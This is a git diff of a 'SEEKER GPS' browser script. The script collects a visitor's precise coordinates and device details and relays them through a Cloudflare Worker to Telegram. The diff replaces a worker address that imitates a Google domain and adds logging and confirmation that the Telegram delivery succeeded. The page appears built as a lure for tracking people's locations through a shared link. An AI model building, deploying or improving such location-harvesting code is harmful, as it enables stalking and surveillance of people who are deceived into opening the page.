@@ -11,8 +11,11 @@
 const locationBtn = document.getElementById("locationBtn");
 const result = document.getElementById("result");
 
+// IMPORTANT:
+// Use the standalone API Worker that has been tested successfully.
+
 const WORKER_URL =
-    "https://google-com.ykzir-polyglot.workers.dev/api/report";
+    "https://dark-hill-bae4.ykzir-polyglot.workers.dev/api/report";
 
 
 // ==========================================
@@ -93,20 +96,42 @@ async function sendLocation(latitude, longitude, accuracy) {
 
     };
 
-    console.log("Sending report to Cloudflare...");
-    console.log("Report:", report);
+    console.log("SEEKER GPS: Sending report to Cloudflare...");
+    console.log("SEEKER GPS: Report prepared.");
 
-    const response = await fetch(WORKER_URL, {
+    let response;
 
-        method: "POST",
+    try {
 
-        headers: {
-            "Content-Type": "application/json"
-        },
+        response = await fetch(WORKER_URL, {
 
-        body: JSON.stringify(report)
+            method: "POST",
 
-    });
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify(report)
+
+        });
+
+    } catch (networkError) {
+
+        console.error(
+            "SEEKER GPS NETWORK ERROR:",
+            networkError
+        );
+
+        throw new Error(
+            "Cannot connect to Cloudflare Worker. Check your internet connection."
+        );
+
+    }
+
+    console.log(
+        "Cloudflare HTTP Status:",
+        response.status
+    );
 
     let data;
 
@@ -114,7 +139,12 @@ async function sendLocation(latitude, longitude, accuracy) {
 
         data = await response.json();
 
-    } catch {
+    } catch (parseError) {
+
+        console.error(
+            "SEEKER GPS RESPONSE ERROR:",
+            parseError
+        );
 
         throw new Error(
             "Cloudflare returned an invalid or empty response."
@@ -122,20 +152,30 @@ async function sendLocation(latitude, longitude, accuracy) {
 
     }
 
-    console.log("Cloudflare HTTP Status:", response.status);
-    console.log("Cloudflare Response:", data);
+    console.log(
+        "Cloudflare Response:",
+        data
+    );
 
-    // IMPORTANT:
-    // Worker returns "success", NOT "ok".
+    // Worker returns success, not ok.
 
     if (!response.ok || data.success !== true) {
 
-        throw new Error(
-            data.error ||
-            "Cloudflare backend request failed."
-        );
+        const errorMessage = [
+            data.error || "Cloudflare backend request failed.",
+            data.telegram_error_code
+                ? "Telegram error code: " + data.telegram_error_code
+                : "",
+            data.telegram_description || ""
+        ].filter(Boolean).join(" | ");
+
+        throw new Error(errorMessage);
 
     }
+
+    console.log(
+        "SEEKER GPS: Telegram delivery confirmed."
+    );
 
     return data;
 
@@ -156,6 +196,14 @@ if (!locationBtn || !result) {
 
     locationBtn.addEventListener("click", function() {
 
+        // Prevent multiple simultaneous requests.
+
+        if (locationBtn.disabled) {
+            return;
+        }
+
+        // Check browser geolocation support.
+
         if (!navigator.geolocation) {
 
             result.textContent =
@@ -164,6 +212,8 @@ if (!locationBtn || !result) {
             return;
 
         }
+
+        // Check secure HTTPS context.
 
         if (!window.isSecureContext) {
 
@@ -178,6 +228,12 @@ if (!locationBtn || !result) {
 
         result.textContent =
             "Requesting location permission...";
+
+        console.log(
+            "SEEKER GPS: Waiting for user location permission."
+        );
+
+        // Request location only after explicit button click.
 
         navigator.geolocation.getCurrentPosition(
 
@@ -196,13 +252,27 @@ if (!locationBtn || !result) {
                 const accuracy =
                     position.coords.accuracy;
 
-                console.log("Latitude:", latitude);
-                console.log("Longitude:", longitude);
-                console.log("Accuracy:", accuracy);
+                console.log(
+                    "Latitude:",
+                    latitude
+                );
+
+                console.log(
+                    "Longitude:",
+                    longitude
+                );
+
+                console.log(
+                    "Accuracy:",
+                    accuracy
+                );
 
                 const device = getDeviceInfo();
 
-                console.log("Device Information:", device);
+                console.log(
+                    "Device Information:",
+                    device
+                );
 
                 result.textContent =
                     "Location obtained. Sending report to server...";
@@ -234,7 +304,8 @@ if (!locationBtn || !result) {
                     );
 
                     result.textContent =
-                        "Location obtained, but server delivery failed. Check the console.";
+                        "Location obtained, but server delivery failed: " +
+                        error.message;
 
                 } finally {
 
@@ -251,26 +322,36 @@ if (!locationBtn || !result) {
 
             function(error) {
 
-                console.error("GPS ERROR:", error);
+                console.error(
+                    "SEEKER GPS LOCATION ERROR:",
+                    error
+                );
 
                 switch (error.code) {
 
                     case 1:
+
                         result.textContent =
                             "Location permission was denied.";
+
                         break;
 
                     case 2:
+
                         result.textContent =
                             "Location information is unavailable.";
+
                         break;
 
                     case 3:
+
                         result.textContent =
                             "Location request timed out.";
+
                         break;
 
                     default:
+
                         result.textContent =
                             "An unknown GPS error occurred.";
 
